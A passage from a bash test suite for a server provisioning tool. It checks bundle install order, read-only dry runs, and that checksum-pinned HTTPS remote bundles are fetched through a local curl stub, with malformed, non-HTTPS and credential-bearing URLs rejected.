first_line="$(printf '%s\n' "$output" | grep -n 'first 1.0.0' | cut -d: -f1)"
second_line="$(printf '%s\n' "$output" | grep -n 'second 2.0.0' | cut -d: -f1)"
[[ -n "$first_line" && -n "$second_line" && "$first_line" -lt "$second_line" ]] \
    && ok "plan preserves bundle order" || bad "plan order"

# A dry run is a preview and must stay read-only: no log directory, no lock,
# no root. This regressed invisibly until CI ran the suite unprivileged, where
# server-provision.sh died on mkdir /workspace/startup-logs before printing.
DRY_WS="$TMP/dryrun-workspace"
WORKSPACE_ROOT="$DRY_WS" ./server-provision.sh --plan "$PLAN_DIR/plan.sh" --dry-run >/dev/null 2>&1 \
    && [[ ! -e "$DRY_WS" ]] \
    && ok "dry run creates no workspace or log files" || bad "dry run has side effects"
if (( EUID == 0 )) && command -v setpriv >/dev/null 2>&1; then
    # mktemp -d is mode 700, so the unprivileged user needs traverse rights on
    # $TMP itself, not just on the plan directory inside it.
    chmod a+rx "$TMP" 2>/dev/null || true
    chmod -R a+rX "$PLAN_DIR" 2>/dev/null || true
    setpriv --reuid=65534 --regid=65534 --clear-groups \
        ./server-provision.sh --plan "$PLAN_DIR/plan.sh" --dry-run 2>/dev/null | grep -q 'Bundles: 2' \
        && ok "dry run works without root" || bad "dry run requires root"
else
    ok "dry run without root (already unprivileged or setpriv absent)"
fi

section "Provision integration"
if (( EUID == 0 )); then
    FULL="$TMP/full"; mkdir -p "$FULL/bin" "$FULL/bootstrap-src/base-1.2.0"
    cat > "$FULL/bootstrap-src/base-1.2.0/server-bootstrap.sh" <<'FAKEBOOT'
#!/usr/bin/env bash
set -e
printf 'bootstrap\n' >> "$PROVISION_ORDER_LOG"
cat > "$PROVISION_FAKE_BIN/server-accept" <<'ACCEPT'
#!/usr/bin/env bash
printf 'accept\n' >> "$PROVISION_ORDER_LOG"
exit 0
ACCEPT
cat > "$PROVISION_FAKE_BIN/server-bundle-install" <<'BUNDLE'
#!/usr/bin/env bash
set -e
name= archive= sha_file= delete=0
while (($#)); do
  case "$1" in
    --name) name="$2"; shift 2 ;;
    --archive) archive="$2"; shift 2 ;;
    --sha256-file) sha_file="$2"; shift 2 ;;
    --delete-after-success) delete=1; shift ;;
    --) break ;;
    *) shift ;;
  esac
done
printf 'bundle:%s\n' "$name" >> "$PROVISION_ORDER_LOG"
(( delete == 0 )) || rm -f -- "$archive" "$sha_file"
BUNDLE
chmod 0755 "$PROVISION_FAKE_BIN/server-accept" "$PROVISION_FAKE_BIN/server-bundle-install"
FAKEBOOT
    chmod +x "$FULL/bootstrap-src/base-1.2.0/server-bootstrap.sh"
    tar -czf "$FULL/base.tar.gz" -C "$FULL/bootstrap-src" base-1.2.0
    sha256sum "$FULL/base.tar.gz" > "$FULL/base.sha256"
    : > "$FULL/one.tar.gz"; sha256sum "$FULL/one.tar.gz" > "$FULL/one.sha256"
    : > "$FULL/two.tar.gz"; sha256sum "$FULL/two.tar.gz" > "$FULL/two.sha256"
    cat > "$FULL/plan.sh" <<'PLAN'
export WORKSPACE_ROOT="$PLAN_DIR/workspace"
export PATH="$PLAN_DIR/bin:$PATH"
export PROVISION_FAKE_BIN="$PLAN_DIR/bin"
export PROVISION_ORDER_LOG="$PLAN_DIR/order.log"
export ACCEPT_POLICY=reject-stop
export DELETE_ARCHIVES_AFTER_SUCCESS=1
register_bootstrap ./base.tar.gz ./base.sha256
register_bundle one 1.0.0 ./one.tar.gz ./one.sha256 install.sh
register_bundle two 2.0.0 ./two.tar.gz ./two.sha256 install.sh
PLAN
    if ./server-provision.sh --plan "$FULL/plan.sh" >/dev/null \
        && [[ "$(cat "$FULL/order.log")" == $'bootstrap\naccept\nbundle:one\nbundle:two' ]] \
        && [[ ! -e "$FULL/base.tar.gz" && ! -e "$FULL/one.tar.gz" && ! -e "$FULL/two.tar.gz" ]]; then
        ok "full provision order and cleanup"
    else
        bad "full provision integration"
    fi
else
    ok "full provision integration skipped without root"
fi

section "Remote bundles: checksum-pinned HTTPS sources"
# Every fetch goes through a curl stub, first on PATH, that logs the URL and
# serves a local fixture. Nothing here reaches the network: example.invalid
# never resolves, and the stub's call count is how "before download" is proven.
REMOTE="$TMP/remote"; mkdir -p "$REMOTE/bin" "$REMOTE/src/rtool-1.0.0"
REMOTE="$(cd "$REMOTE" && pwd -P)"
printf '1.0.0\n' > "$REMOTE/src/rtool-1.0.0/VERSION"
cat > "$REMOTE/src/rtool-1.0.0/setup tool.sh" <<'INSTALL'
#!/usr/bin/env bash
set -e
printf '[%s]' "$@" > "$RTOOL_MARK"
INSTALL
tar -czf "$REMOTE/rtool-1.0.0.tar.gz" -C "$REMOTE/src" rtool-1.0.0
cat > "$REMOTE/bin/curl" <<'CURL'
#!/usr/bin/env bash
out=
for ((i = 1; i <= $#; i++)); do
    [[ "${!i}" == -o ]] && { j=$((i + 1)); out="${!j}"; }
done
printf '%s\n' "${!#}" >> "$CURL_LOG"
[[ -z "$out" ]] || cp -- "$REMOTE_FIXTURE" "$out"
CURL
chmod 0755 "$REMOTE/bin/curl"
RSHA="$(sha256sum "$REMOTE/rtool-1.0.0.tar.gz" | cut -c1-64)"
RSHA_UPPER="${RSHA^^}"
ROTHER="$(printf 'another archive\n' | sha256sum | cut -c1-64)"
RURL=https://example.invalid/rtool-1.0.0.tar.gz
RARGS=(--flag 'two words' "it's" '$HOME' '*' 'say "hi"' '')
RARGS_SEEN="$(printf '[%s]' "${RARGS[@]}")"
# Credential-shaped test data is built at runtime, never committed (SECURITY.md).
RCRED="$(printf '%s:%s' demo-user demo-secret)"
RCRED_URLS=("https://$RCRED@example.invalid/rtool-1.0.0.tar.gz" "https://demo-user@example.invalid/rtool-1.0.0.tar.gz")
rcred_leak() { [[ "$1" == *demo-user* || "$1" == *demo-secret* ]]; }
rfetches() { if [[ -f "$REMOTE/curl.log" ]]; then wc -l < "$REMOTE/curl.log"; else echo 0; fi; }
rinstall() {  # STATE_ROOT, then server-bundle-install arguments
    local state="$1"; shift
    PATH="$REMOTE/bin:$PATH" CURL_LOG="$REMOTE/curl.log" REMOTE_FIXTURE="$REMOTE/rtool-1.0.0.tar.gz" \
        RTOOL_MARK="$REMOTE/mark" STATE_ROOT="$state" "$ROOT/server-bundle-install" "$@"
}

rm -f "$REMOTE/curl.log" "$REMOTE/mark"
if rinstall "$REMOTE/state" --name rtool --version 1.0.0 --source "$RURL" --sha256 "$RSHA" \
        --installer 'setup tool.sh' -- "${RARGS[@]}" >/dev/null 2>&1 \
    && [[ "$(rfetches)" == 1 && "$(cat "$REMOTE/curl.log")" == "$RURL" ]]; then
    ok "a pinned HTTPS bundle with a lowercase SHA-256 is fetched once and installed"
else bad "remote install with a lowercase SHA-256"; fi
[[ "$(cat "$REMOTE/mark" 2>/dev/null)" == "$RARGS_SEEN" ]] \
    && ok "remote installer name, argument order, spaces and quoting are preserved" \
    || bad "remote installer arguments: $(cat "$REMOTE/mark" 2>/dev/null)"
[[ "$(cat "$REMOTE/state/bundles/rtool/archive-sha256" 2>/dev/null)" == "$RSHA" \
    && "$(cat "$REMOTE/state/bundles/rtool/source" 2>/dev/null)" == "$RURL" \
    && "$(cat "$REMOTE/state/bundles/rtool/installer" 2>/dev/null)" == 'setup tool.sh' ]] \
    && ok "remote state records the checksum, URL and installer" || bad "remote state"

rm -f "$REMOTE/curl.log"
if rinstall "$REMOTE/state-upper" --name rtool --version 1.0.0 --source "$RURL" --sha256 "$RSHA_UPPER" \
        --installer 'setup tool.sh' >/dev/null 2>&1 \
    && [[ "$(rfetches)" == 1 && "$(cat "$REMOTE/state-upper/bundles/rtool/archive-sha256" 2>/dev/null)" == "$RSHA" ]]; then
    ok "an uppercase SHA-256 is accepted and recorded in lowercase"
else bad "remote install with an uppercase SHA-256"; fi

rm -f "$REMOTE/curl.log" "$REMOTE/mark"
if rinstall "$REMOTE/state" --name rtool --version 1.0.0 --source "$RURL" --sha256 "$RSHA" \
        --installer 'setup tool.sh' >/dev/null 2>&1 \
    && rinstall "$REMOTE/state" --name rtool --version 1.0.0 --source "$RURL" --sha256 "$RSHA_UPPER" \
        --installer 'setup tool.sh' >/dev/null 2>&1 \
    && [[ "$(rfetches)" == 0 && ! -e "$REMOTE/mark" ]]; then
    ok "the same version and checksum is skipped before the fetch stub is called"
else bad "an installed remote bundle reached the fetch stub ($(rfetches) calls)"; fi

rm -f "$REMOTE/curl.log"
rout="$(rinstall "$REMOTE/state" --name rtool --version 1.0.0 --source "$RURL" --sha256 "$ROTHER" 2>&1)"; rcode=$?
[[ "$rcode" != 0 && "$rout" == *'different archive hash'* && "$(rfetches)" == 0 \
    && "$(cat "$REMOTE/state/bundles/rtool/archive-sha256")" == "$RSHA" ]] \
    && ok "the same version with a different checksum fails before the fetch stub is called" \
    || bad "remote checksum conflict (exit $rcode, $(rfetches) fetches)"

rm -f "$REMOTE/curl.log" "$REMOTE/mark"
rinstall "$REMOTE/state" --name rtool --version 1.0.0 --source "$RURL" --sha256 "$RSHA" \
    --installer 'setup tool.sh' --force >/dev/null 2>&1 && [[ "$(rfetches)" == 1 && -e "$REMOTE/mark" ]] \
    && ok "the existing --force path still fetches and reinstalls" || bad "remote --force"

rm -f "$REMOTE/curl.log"
if rinstall "$REMOTE/state-bad" --name rtool --version 1.0.0 --source "$RURL" --sha256 "${RSHA:0:63}" >/dev/null 2>&1 \
    || rinstall "$REMOTE/state-bad" --name rtool --version 1.0.0 --source "${RURL/https/http}" --sha256 "$RSHA" >/dev/null 2>&1; then
    bad "server-bundle-install accepted a malformed checksum or an http:// source"
elif [[ "$(rfetches)" == 0 && ! -e "$REMOTE/state-bad" ]]; then
    ok "server-bundle-install rejects a malformed checksum or http:// source without fetching"
else bad "server-bundle-install fetched before rejecting its input"; fi

# A credential in a source URL would reach curl's arguments, the log, and the
# recorded source. The engine refuses it before anything else, the installed-
# state fast path included, and never echoes it back.
rcred_ok=1
for url in "${RCRED_URLS[@]}"; do
    rm -f "$REMOTE/curl.log"
    rout="$(rinstall "$REMOTE/state-cred" --name rtool --version 1.0.0 --source "$url" --sha256 "$RSHA" 2>&1)"; rcode=$?
    [[ "$rcode" != 0 && "$rout" == *'must not carry credentials'* && "$(rfetches)" == 0 && ! -e "$REMOTE/state-cred" ]] \
        && ! rcred_leak "$rout" || rcred_ok=0
done
(( rcred_ok )) && ok "server-bundle-install refuses a credential-bearing URL: no fetch, no state, no echo" \
    || bad "server-bundle-install accepted or echoed a credential-bearing URL (exit $rcode, $(rfetches) fetches)"
rcred_ok=1
for url in "${RCRED_URLS[@]}"; do
    rm -f "$REMOTE/curl.log"
    rout="$(rinstall "$REMOTE/state" --name rtool --version 1.0.0 --source "$url" --sha256 "$RSHA" 2>&1)"; rcode=$?
    [[ "$rcode" != 0 && "$rout" == *'must not carry credentials'* && "$rout" != *'already installed'* \
        && "$(rfetches)" == 0 ]] && ! rcred_leak "$rout" || rcred_ok=0
done
[[ "$(cat "$REMOTE/state/bundles/rtool/source")" == "$RURL" ]] && ! grep -rqsF demo- "$REMOTE/state" || rcred_ok=0
(( rcred_ok )) && ok "a credential-bearing URL is refused before the installed-state fast path" \
    || bad "a credential-bearing URL reached the fast path or the state (exit $rcode)"

# The local deletion path strips an optional file:// prefix and removes what is
# left. A URL must never get that far: put files where an https:// URL and its
# sidecar would land, relative to the working directory, and prove they survive
# both an installation and a skip.
mkdir -p "$REMOTE/cwd/https:/example.invalid"
printf 'keep\n' > "$REMOTE/cwd/https:/example.invalid/rtool-1.0.0.tar.gz"
printf '%s  rtool-1.0.0.tar.gz\n' "$RSHA" > "$REMOTE/cwd/rtool.sha256"
rm -f "$REMOTE/curl.log"
rout="$(cd "$REMOTE/cwd" \
    && rinstall "$REMOTE/state-delete" --name rtool --version 1.0.0 --source "$RURL" \
        --sha256-file rtool.sha256 --installer 'setup tool.sh' --delete-after-success 2>&1 \
    && rinstall "$REMOTE/state-delete" --name rtool --version 1.0.0 --source "$RURL" \
        --sha256-file rtool.sha256 --installer 'setup tool.sh' --delete-after-success 2>&1)"; rcode=$?
[[ "$rcode" == 0 && "$(rfetches)" == 1 && "$rout" != *'deleted installed archive'* \
    && -e "$REMOTE/cwd/https:/example.invalid/rtool-1.0.0.tar.gz" && -e "$REMOTE/cwd/rtool.sha256" ]] \
    && ok "a remote source never enters local archive deletion, installed or skipped" \
    || bad "a remote source reached local archive deletion (exit $rcode)"

# Local archives keep verify-first: a recorded match must not skip an archive
# whose bytes no longer match its sidecar, and a failure keeps the file.
cp "$FIX/demo-1.0.0.tar.gz" "$FIX/corrupt.tar.gz"; printf 'x' >> "$FIX/corrupt.tar.gz"
if DEMO_MARK="$FIX/corrupt-mark" STATE_ROOT="$STATE" ./server-bundle-install --name demo --version 1.0.0 \
    --archive "$FIX/corrupt.tar.gz" --sha256-file "$FIX/demo.sha256" --delete-after-success >/dev/null 2>&1; then
    bad "a recorded local match skipped verification of a changed archive"
elif [[ -e "$FIX/corrupt.tar.gz" && -e "$FIX/demo.sha256" ]]; then
    ok "a local archive is still verified before a recorded match can skip it"
else bad "local verification failure deleted its archive"; fi

# server-bootstrap.sh hands INSTALL_ADDON to sb_install_bundle directly, not
# through server-bundle-install, so the pre-download decision has to live in
# the shared engine. This is that call, with the stub on PATH.
grep -qF 'sb_install_bundle "$ADDON_NAME" "$ADDON_VERSION" "$ADDON_URL" "$ADDON_SHA256"' server-bootstrap.sh \
    && ok "the legacy add-on path still uses the shared bundle engine" \
    || bad "the legacy add-on path no longer calls sb_install_bundle"
addon_engine() {  # STATE_ROOT SHA256 [URL]; the ERR trap reports the failing command, as on_error does
    PATH="$REMOTE/bin:$PATH" CURL_LOG="$REMOTE/curl.log" REMOTE_FIXTURE="$REMOTE/rtool-1.0.0.tar.gz" \
        RTOOL_MARK="$REMOTE/mark" bash -c 'set -Eeuo pipefail; source lib/bundle.sh; SB_LOG_PREFIX=server-bootstrap
            trap "echo \"command: \$BASH_COMMAND\" >&2" ERR
            sb_install_bundle rtool 1.0.0 "$1" "$2" "setup tool.sh" 0 0 "$3" "" --addon-arg' _ "${3:-$RURL}" "$2" "$1"
}
rm -f "$REMOTE/curl.log" "$REMOTE/mark"
addon_engine "$REMOTE/state-addon" "$RSHA" >/dev/null 2>&1; first_code=$?; first_fetches="$(rfetches)"
rm -f "$REMOTE/mark"
addon_engine "$REMOTE/state-addon" "$RSHA_UPPER" >/dev/null 2>&1; second_code=$?
[[ "$first_code" == 0 && "$first_fetches" == 1 && "$second_code" == 0 && "$(rfetches)" == 1 && ! -e "$REMOTE/mark" ]] \
    && ok "the legacy add-on path skips an installed remote bundle before downloading" \
    || bad "legacy add-on skip (exits $first_code/$second_code, $(rfetches) fetches)"
addon_engine "$REMOTE/state-addon" "$ROTHER" >/dev/null 2>&1 && addon_code=0 || addon_code=$?
[[ "$addon_code" != 0 && "$(rfetches)" == 1 ]] \
    && ok "the legacy add-on path refuses a changed checksum before downloading" \
    || bad "legacy add-on checksum conflict (exit $addon_code, $(rfetches) fetches)"
rcred_ok=1
for url in "${RCRED_URLS[@]}"; do
    for state in "$REMOTE/state-addon-cred" "$REMOTE/state-addon"; do
        rm -f "$REMOTE/curl.log"
        rout="$(addon_engine "$state" "$RSHA" "$url" 2>&1)"; rcode=$?
        [[ "$rcode" != 0 && "$rout" == *'must not carry credentials'* && "$(rfetches)" == 0 ]] \
            && ! rcred_leak "$rout" || rcred_ok=0
    done
done
[[ ! -e "$REMOTE/state-addon-cred" && "$(cat "$REMOTE/state-addon/bundles/rtool/source")" == "$RURL" ]] \
    && ! grep -rqsF demo- "$REMOTE/state-addon" || rcred_ok=0
(( rcred_ok )) && ok "the legacy add-on path refuses a credential-bearing URL: no fetch, no state, no echo" \
    || bad "the legacy add-on path accepted or echoed a credential-bearing URL (exit $rcode)"

section "Remote bundles: plan registration"
RPLAN="$REMOTE/plan"; mkdir -p "$RPLAN" "$REMOTE/dry-tmp"
{
    printf 'register_bootstrap ./base.tar.gz ./base.sha256\n'
    printf 'register_bundle first 1.0.0 ./first.tar.gz ./first.sha256 install.sh --one\n'
    printf 'register_remote_bundle rtool 1.0.0 %q %q %q' "$RURL" "$RSHA_UPPER" 'setup tool.sh'
    printf ' %q' "${RARGS[@]}"; printf '\n'
    printf 'register_bundle last 3.0.0 ./last.tar.gz ./last.sha256\n'
} > "$RPLAN/plan.sh"
rdry() {  # plan, then extra environment for a dry run with the stub on PATH
    local plan="$1"; shift
    env PATH="$REMOTE/bin:$PATH" CURL_LOG="$REMOTE/curl.log" TMPDIR="$REMOTE/dry-tmp" \
        WORKSPACE_ROOT="$REMOTE/dry-ws" "$@" "$ROOT/server-provision.sh" --plan "$plan" --dry-run
}
rm -f "$REMOTE/curl.log"
before="$(find "$REMOTE" | LC_ALL=C sort)"
rout="$(rdry "$RPLAN/plan.sh" 2>&1)"; rcode=$?
after="$(find "$REMOTE" | LC_ALL=C sort)"
expected_dry="$(printf '%s\n' "Provision plan: $RPLAN/plan.sh" "Bootstrap: $RPLAN/base.tar.gz" 'Bundles: 3' \
    "  1. first 1.0.0 <- $RPLAN/first.tar.gz" \
    "  2. rtool 1.0.0 <- $RURL (sha256 $RSHA)" \
    "  3. last 3.0.0 <- $RPLAN/last.tar.gz")"
[[ "$rcode" == 0 && "$rout" == "$expected_dry" ]] \
    && ok "dry run lists local and remote bundles in plan order, the checksum lowercased" \
    || bad "remote dry-run output: $rout"
[[ "$before" == "$after" && ! -e "$REMOTE/curl.log" ]] \
    && ok "a remote dry run makes no request and creates no files" || bad "a remote dry run had side effects"
if (( EUID == 0 )) && command -v setpriv >/dev/null 2>&1; then
    chmod a+rx "$TMP" "$REMOTE" "$REMOTE/bin" "$RPLAN" 2>/dev/null || true
    chmod a+r "$RPLAN/plan.sh" 2>/dev/null || true
    setpriv --reuid=65534 --regid=65534 --clear-groups env PATH="$REMOTE/bin:$PATH" \
        "$ROOT/server-provision.sh" --plan "$RPLAN/plan.sh" --dry-run 2>/dev/null \
        | grep -qF "  2. rtool 1.0.0 <- $RURL (sha256 $RSHA)" \
        && ok "a remote dry run works without root" || bad "a remote dry run requires root"
else
    ok "remote dry run without root (already unprivileged or setpriv absent)"
fi

rm -f "$REMOTE/curl.log"
before="$(find "$REMOTE" | LC_ALL=C sort)"
rout="$(rdry "$ROOT/examples/provision-plan.remote.example.sh" 2>&1)"; rcode=$?
after="$(find "$REMOTE" | LC_ALL=C sort)"
[[ "$rcode" == 0 && "$rout" == *'Bundles: 1'* \
    && "$rout" == *'  1. example-toolkit 1.0.0 <- https://example.com/example-toolkit-1.0.0.tar.gz (sha256 '* \
    && "$before" == "$after" && ! -e "$REMOTE/curl.log" ]] \
    && ok "the documented remote example previews its bundle without a request or a file" \
    || bad "remote example dry run: $rout"

# Without --dry-run the example must stop while the plan is read. Beside it sit
# a bootstrap archive whose installer leaves a mark and the checksum sidecar a
# successful run would delete; neither may be touched, and no log, lock, or
# request may appear.
REX="$REMOTE/example-real"; mkdir -p "$REX/src/base" "$REX/tmp"
rex_version="$(tr -d '[:space:]' < VERSION)"
printf '#!/usr/bin/env bash\ntouch %q\n' "$REX/bootstrap-ran" > "$REX/src/base/server-bootstrap.sh"
tar -czf "$REX/server-bootstrap-$rex_version.tar.gz" -C "$REX/src" base
sha256sum "$REX/server-bootstrap-$rex_version.tar.gz" > "$REX/server-bootstrap-$rex_version.tar.gz.sha256"
cp examples/provision-plan.remote.example.sh "$REX/plan.sh"
rm -f "$REMOTE/curl.log"
before="$(find "$REX" | LC_ALL=C sort)"
rout="$(PATH="$REMOTE/bin:$PATH" CURL_LOG="$REMOTE/curl.log" TMPDIR="$REX/tmp" WORKSPACE_ROOT="$REX/ws" \
    ./server-provision.sh --plan "$REX/plan.sh" 2>&1)"; rcode=$?
after="$(find "$REX" | LC_ALL=C sort)"
[[ "$rcode" == 2 && "$rout" == *'preview-only'* && "$before" == "$after" && ! -e "$REX/bootstrap-ran" \
    && ! -e "$REX/ws" && ! -e "$REX/tmp/server-provision.lock" && ! -e "$REMOTE/curl.log" ]] \
    && ok "the remote example refuses a real run before bootstrap, logging, deletion, or a fetch" \
    || bad "the remote example ran without --dry-run (exit $rcode): $rout"

raccept=1
for url in https://example.invalid:8443/pkg/rtool-1.0.0.tgz https://127.0.0.1/rtool-1.0.0.zip \
    'https://[::1]/rtool-1.0.0.tar.xz' https://registry.example.invalid/@scope/rtool/-/rtool-1.0.0.txz; do
    printf 'register_bootstrap ./base.tar.gz ./base.sha256\nregister_remote_bundle rtool 1.0.0 %q %q\n' \
        "$url" "$RSHA" > "$RPLAN/accept.sh"
    rdry "$RPLAN/accept.sh" 2>/dev/null | grep -qF -- "<- $url (sha256 $RSHA)" \
        || { bad "plan rejected a valid HTTPS URL: $url"; raccept=0; }
done
(( raccept )) && ok "plan accepts a port, an IP literal and an @-scoped path"

# Each rejection is checked in a dry run and in a real run: the plan is read
# before either does anything, so neither may fetch, create the workspace, or
# echo a credential back.
remote_plan_rejects() {  # label, expected reason, text never echoed, then register_remote_bundle arguments
    local label="$1" reason="$2" secret="$3" dir out code mode clean=1
    shift 3
    dir="$(mktemp -d "$TMP/remote-reject.XXXXXX")"
    { printf 'register_bootstrap ./base.tar.gz ./base.sha256\nregister_remote_bundle'
      printf ' %q' "$@"; printf '\n'; } > "$dir/plan.sh"
    for mode in --dry-run ''; do
        out="$(PATH="$REMOTE/bin:$PATH" CURL_LOG="$dir/curl.log" TMPDIR="$dir" WORKSPACE_ROOT="$dir/ws" \
            ./server-provision.sh --plan "$dir/plan.sh" ${mode:+"$mode"} 2>&1)"; code=$?
        [[ "$code" == 2 && "$out" == *"ERROR: register_remote_bundle"*"$reason"* \
            && ! -e "$dir/curl.log" && ! -e "$dir/ws" ]] || clean=0
        [[ -z "$secret" || "$out" != *"$secret"* ]] || clean=0
    done
    (( clean )) && ok "plan rejects $label before any request" \
        || bad "plan did not cleanly reject $label (last exit $code)"
}
RWHY_SCHEME="URL must start with https://"
RWHY_CRED="URL must not carry credentials"
RWHY_PLAIN="URL is not a plain https://HOST/PATH address"
RWHY_ARCHIVE="URL must name a .tar.gz"
RWHY_SHA="SHA-256 must be exactly 64 hexadecimal characters"
RWHY_ARGS="needs NAME VERSION HTTPS_URL SHA256"
remote_plan_rejects "an http:// URL" "$RWHY_SCHEME" "" rtool 1.0.0 http://example.invalid/rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "an ftp:// URL" "$RWHY_SCHEME" "" rtool 1.0.0 ftp://example.invalid/rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "a file:// URL" "$RWHY_SCHEME" "" rtool 1.0.0 file:///srv/rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "a local path" "$RWHY_SCHEME" "" rtool 1.0.0 ./rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "an upper-case HTTPS:// scheme" "$RWHY_SCHEME" "" rtool 1.0.0 HTTPS://example.invalid/rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "a scheme-relative URL" "$RWHY_SCHEME" "" rtool 1.0.0 //example.invalid/rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "a user and password in the URL" "$RWHY_CRED" demo-secret rtool 1.0.0 \
    "https://$RCRED@example.invalid/rtool-1.0.0.tar.gz" "$RSHA"
remote_plan_rejects "a user name in the URL" "$RWHY_CRED" demo-user rtool 1.0.0 \
    https://demo-user@example.invalid/rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "a password with no user name in the URL" "$RWHY_CRED" demo-secret rtool 1.0.0 \
    "https://${RCRED#demo-user}@example.invalid/rtool-1.0.0.tar.gz" "$RSHA"
remote_plan_rejects "percent-encoded credentials in the URL" "$RWHY_CRED" demo-secret rtool 1.0.0 \
    "https://demo-user%3Ademo-secret@example.invalid/rtool-1.0.0.tar.gz" "$RSHA"
remote_plan_rejects "an empty URL" "$RWHY_SCHEME" "" rtool 1.0.0 '' "$RSHA"
remote_plan_rejects "a URL with no host" "$RWHY_PLAIN" "" rtool 1.0.0 https:///rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "a URL with no path" "$RWHY_PLAIN" "" rtool 1.0.0 https://example.invalid "$RSHA"
remote_plan_rejects "a URL with no file name" "$RWHY_PLAIN" "" rtool 1.0.0 https://example.invalid/ "$RSHA"
remote_plan_rejects "a space in the host" "$RWHY_PLAIN" "" rtool 1.0.0 'https://exa mple.invalid/rtool-1.0.0.tar.gz' "$RSHA"
remote_plan_rejects "a newline in the URL" "$RWHY_PLAIN" "" rtool 1.0.0 $'https://example.invalid/rtool-1.0.0.tar.gz\nx.tar.gz' "$RSHA"
remote_plan_rejects "a backslash in the URL" "$RWHY_PLAIN" "" rtool 1.0.0 'https://example.invalid\rtool-1.0.0.tar.gz' "$RSHA"
remote_plan_rejects "a host starting with a hyphen" "$RWHY_PLAIN" "" rtool 1.0.0 https://-example.invalid/rtool-1.0.0.tar.gz "$RSHA"
remote_plan_rejects "a query string" "$RWHY_PLAIN" "" rtool 1.0.0 'https://example.invalid/rtool-1.0.0.tar.gz?sig=abc' "$RSHA"
remote_plan_rejects "a fragment" "$RWHY_PLAIN" "" rtool 1.0.0 'https://example.invalid/rtool-1.0.0.tar.gz#part' "$RSHA"
remote_plan_rejects "a URL that names no supported archive" "$RWHY_ARCHIVE" "" rtool 1.0.0 https://example.invalid/rtool-1.0.0.txt "$RSHA"
remote_plan_rejects "a 63-character SHA-256" "$RWHY_SHA" "" rtool 1.0.0 "$RURL" "${RSHA:0:63}"
remote_plan_rejects "a 65-character SHA-256" "$RWHY_SHA" "" rtool 1.0.0 "$RURL" "${RSHA}0"
remote_plan_rejects "a non-hexadecimal SHA-256" "$RWHY_SHA" "" rtool 1.0.0 "$RURL" "${RSHA:0:63}g"
remote_plan_rejects "an empty SHA-256" "$RWHY_SHA" "" rtool 1.0.0 "$RURL" ''
remote_plan_rejects "a prefixed SHA-256" "$RWHY_SHA" "" rtool 1.0.0 "$RURL" "sha256:$RSHA"
remote_plan_rejects "a SHA-256 containing a space" "$RWHY_SHA" "" rtool 1.0.0 "$RURL" "${RSHA:0:32} ${RSHA:32}"
remote_plan_rejects "a SHA-256 with a trailing newline" "$RWHY_SHA" "" rtool 1.0.0 "$RURL" "$RSHA"$'\n'
remote_plan_rejects "a missing SHA-256" "$RWHY_ARGS" "" rtool 1.0.0 "$RURL"

section "Remote bundles: provision integration"
if (( EUID == 0 )); then
    RFULL="$TMP/remote-full"; mkdir -p "$RFULL/bin" "$RFULL/bootstrap-src/base-1.2.0"
    RFULL="$(cd "$RFULL" && pwd -P)"
    cat > "$RFULL/bootstrap-src/base-1.2.0/server-bootstrap.sh" <<'FAKEBOOT'
#!/usr/bin/env bash
set -e
cat > "$PROVISION_FAKE_BIN/server-accept" <<'ACCEPT'
#!/usr/bin/env bash
exit 0
ACCEPT
cat > "$PROVISION_FAKE_BIN/server-bundle-install" <<'BUNDLE'
#!/usr/bin/env bash
set -e
{ printf '[%s]' "$@"; printf '\n'; } >> "$PROVISION_ARGV_LOG"
archive= sha_file= delete=0
while (($#)); do
  case "$1" in
    --archive) archive="$2"; shift 2 ;;
    --sha256-file) sha_file="$2"; shift 2 ;;
    --delete-after-success) delete=1; shift ;;
    --) break ;;
    *) shift ;;
  esac
done
(( delete == 0 )) || rm -f -- "$archive" "$sha_file"
BUNDLE
chmod 0755 "$PROVISION_FAKE_BIN/server-accept" "$PROVISION_FAKE_BIN/server-bundle-install"
FAKEBOOT
    chmod +x "$RFULL/bootstrap-src/base-1.2.0/server-bootstrap.sh"
    tar -czf "$RFULL/base.tar.gz" -C "$RFULL/bootstrap-src" base-1.2.0
    sha256sum "$RFULL/base.tar.gz" > "$RFULL/base.sha256"
    : > "$RFULL/one.tar.gz"; sha256sum "$RFULL/one.tar.gz" > "$RFULL/one.sha256"
    : > "$RFULL/two.tar.gz"; sha256sum "$RFULL/two.tar.gz" > "$RFULL/two.sha256"
    {
        cat <<'PLAN'
export WORKSPACE_ROOT="$PLAN_DIR/workspace"
export PATH="$PLAN_DIR/bin:$PATH"
export PROVISION_FAKE_BIN="$PLAN_DIR/bin"
export PROVISION_ARGV_LOG="$PLAN_DIR/argv.log"
export ACCEPT_POLICY=reject-stop
export DELETE_ARCHIVES_AFTER_SUCCESS=1
register_bootstrap ./base.tar.gz ./base.sha256
register_bundle one 1.0.0 ./one.tar.gz ./one.sha256 install.sh
PLAN
        printf 'register_remote_bundle rtool 1.0.0 %q %q %q' "$RURL" "$RSHA_UPPER" 'setup tool.sh'
        printf ' %q' "${RARGS[@]}"; printf '\n'
        printf 'register_bundle two 2.0.0 ./two.tar.gz ./two.sha256\n'
    } > "$RFULL/plan.sh"
    expected_argv="$(printf '%s\n' \
        "[--name][one][--version][1.0.0][--archive][$RFULL/one.tar.gz][--sha256-file][$RFULL/one.sha256][--installer][install.sh][--delete-after-success][--]" \
        "[--name][rtool][--version][1.0.0][--source][$RURL][--sha256][$RSHA][--installer][setup tool.sh][--]$RARGS_SEEN" \
        "[--name][two][--version][2.0.0][--archive][$RFULL/two.tar.gz][--sha256-file][$RFULL/two.sha256][--installer][install.sh][--delete-after-success][--]")"
    if ./server-provision.sh --plan "$RFULL/plan.sh" >/dev/null 2>&1 \
        && [[ "$(cat "$RFULL/argv.log" 2>/dev/null)" == "$expected_argv" ]]; then
        ok "provision passes local and remote bundles to server-bundle-install in order, arguments intact"
    else
        bad "provision argv: $(cat "$RFULL/argv.log" 2>/dev/null)"
    fi
    [[ ! -e "$RFULL/base.tar.gz" && ! -e "$RFULL/one.tar.gz" && ! -e "$RFULL/one.sha256" \
        && ! -e "$RFULL/two.tar.gz" && ! -e "$RFULL/two.sha256" ]] \
        && ok "local archives beside a remote bundle are still deleted after success" \
